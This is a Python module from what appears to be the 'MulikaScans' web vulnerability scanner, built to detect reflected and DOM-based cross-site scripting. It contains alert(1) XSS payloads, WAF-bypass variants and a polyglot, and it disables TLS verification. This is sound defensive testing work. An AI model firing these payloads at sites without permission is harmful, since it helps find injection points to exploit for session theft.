"""
MulikaScans — XSS Detection Module
Reflected, DOM, and context-aware XSS detection across URL parameters.
"""

import re
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# ── Payload tiers ─────────────────────────────────────────────────────────────
# Tier 1: basic reflected (fast, used in quick_mode)
XSS_PAYLOADS_BASIC = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "'\"><script>alert(1)</script>",
]

# Tier 2: filter/WAF bypass payloads
XSS_PAYLOADS_ADVANCED = [
    "<svg/onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "\"autofocus onfocus=alert(1) \"",
    "<body onload=alert(1)>",
    # HTML entity bypass
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    # Case variation
    "<ScRiPt>alert(1)</ScRiPt>",
    # Unicode escape
    "<script>\\u0061lert(1)</script>",
    # Double-encode
    "%253Cscript%253Ealert(1)%253C/script%253E",
    # Attribute injection
    "' onmouseover='alert(1)",
    "\" onmouseover=\"alert(1)",
    # JS context
    "';alert(1)//",
    "\";alert(1)//",
    # Template literal injection
    "`${alert(1)}`",
    # Event handlers on various tags
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<object data=javascript:alert(1)>",
    "<math><mtext></table><img src=1 onerror=alert(1)>",
    # Polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
]

XSS_PAYLOADS = XSS_PAYLOADS_BASIC + XSS_PAYLOADS_ADVANCED

REFLECTION_INDICATORS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=",
    "onerror=alert(1)",
    "<svg/onload=",
    "javascript:alert(1)",
    "ontoggle=alert(1)",
    "onfocus=alert(1)",
    "onload=alert(1)",
    "onmouseover='alert(1)",
    "onmouseover=\"alert(1)",
    "';alert(1)",
    "\";alert(1)",
    "<details open ontoggle=",
    "autofocus onfocus=alert",
    "<scRiPt>alert(1)",
    "<ScRiPt>alert(1)",
]

# DOM sink patterns — look for these in JS source
DOM_SINKS = [
    r"document\.write\s*\(",
    r"\.innerHTML\s*=",
    r"\.outerHTML\s*=",
    r"eval\s*\(",
    r"setTimeout\s*\(\s*[\"']",
    r"setInterval\s*\(\s*[\"']",
    r"location\.href\s*=",
    r"location\.replace\s*\(",
    r"location\.assign\s*\(",
    r"\.src\s*=\s*.*location",
    r"document\.domain\s*=",
]


def _inject_param(url, param, payload):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def test_xss(url, timeout=8, quick_mode=False, session=None):
    _req = session if session is not None else requests
    findings = []
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)

    if not qs:
        return findings

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Security Scanner)"})

    # Quick mode: basic payloads only; full mode: all payloads
    payloads = XSS_PAYLOADS_BASIC if quick_mode else XSS_PAYLOADS
    seen = set()

    for param in qs:
        if param in seen:
            continue

        # ── Reflected XSS ──────────────────────────────────────────────────────
        for payload in payloads:
            test_url = _inject_param(url, param, payload)
            try:
                resp = session.get(test_url, timeout=timeout,
                                   allow_redirects=True, verify=False)
                body = resp.text
                body_lower = body.lower()

                matched_indicator = next(
                    (ind for ind in REFLECTION_INDICATORS if ind.lower() in body_lower),
                    None
                )
                if matched_indicator:
                    seen.add(param)
                    # Determine context (HTML, JS, attribute)
                    context = "HTML"
                    if f"'{payload}" in body or f"\"{payload}" in body:
                        context = "attribute"
                    if re.search(r'<script[^>]*>[^<]*' + re.escape(payload[:10]), body, re.I):
                        context = "JavaScript"

                    findings.append({
                        "name": "Reflected Cross-Site Scripting (XSS)",
                        "type": "Reflected XSS",
                        "severity": "High",
                        "cvss_score": 7.4,
                        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
                        "category": "xss",
                        "url_affected": url,
                        "parameter": param,
                        "evidence": (
                            f"Payload '{payload[:60]}' reflected unencoded in {context} context. "
                            f"Indicator matched: '{matched_indicator}'"
                        ),
                        "request_data": test_url,
                        "response_data": body[:600],
                        "cwe_id": "CWE-79",
                        "owasp_category": "A03:2021",
                        "detail": (
                            f"Parameter '{param}' reflects unsanitised input in a {context} context. "
                            f"An attacker can craft a malicious URL that executes arbitrary JavaScript "
                            f"in the victim's browser, enabling session theft, credential harvesting, "
                            f"or keylogging."
                        ),
                        "remediation": (
                            "1. HTML-encode all user-controlled output (use a templating engine that auto-escapes). "
                            "2. For attribute contexts use attribute-encoding. "
                            "3. For JS contexts use JSON encoding. "
                            "4. Deploy a strict Content-Security-Policy with nonces. "
                            "5. Use HttpOnly cookies to limit session theft impact."
                        ),
                        "references": [
                            "https://owasp.org/www-community/attacks/xss/",
                            "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
                            "https://portswigger.net/web-security/cross-site-scripting",
                        ],
                    })
                    break
            except requests.RequestException:
                pass

        if param in seen or quick_mode:
            continue

        # ── DOM Sink Detection (JS source analysis) ────────────────────────────
        try:
            resp = session.get(url, timeout=timeout, allow_redirects=True, verify=False)
            body = resp.text
            for pattern in DOM_SINKS:
                m = re.search(pattern, body, re.I)
                if m:
                    findings.append({
                        "name": "Potential DOM-Based XSS Sink",
                        "type": "DOM XSS",
                        "severity": "Medium",
                        "cvss_score": 6.1,
                        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
                        "category": "xss",
                        "url_affected": url,
                        "parameter": param,
                        "evidence": f"Dangerous DOM sink found: {m.group()[:80]}",
                        "request_data": url,
                        "response_data": body[max(0, m.start()-100):m.end()+100],
                        "cwe_id": "CWE-79",
                        "owasp_category": "A03:2021",
                        "detail": (
                            f"JavaScript source contains the dangerous DOM sink '{m.group()[:60]}'. "
                            "If user-controlled data flows into this sink without sanitisation, "
                            "DOM-based XSS is possible."
                        ),
                        "remediation": (
                            "Avoid dangerous DOM APIs like innerHTML, eval(), and document.write(). "
                            "Use textContent for text nodes, createElement for dynamic HTML. "
                            "Use DOMPurify to sanitise any HTML that must be inserted."
                        ),
                        "references": [
                            "https://portswigger.net/web-security/cross-site-scripting/dom-based",
                            "https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html",
                        ],
                    })
                    seen.add(param)
                    break
        except requests.RequestException:
            pass

    return findings
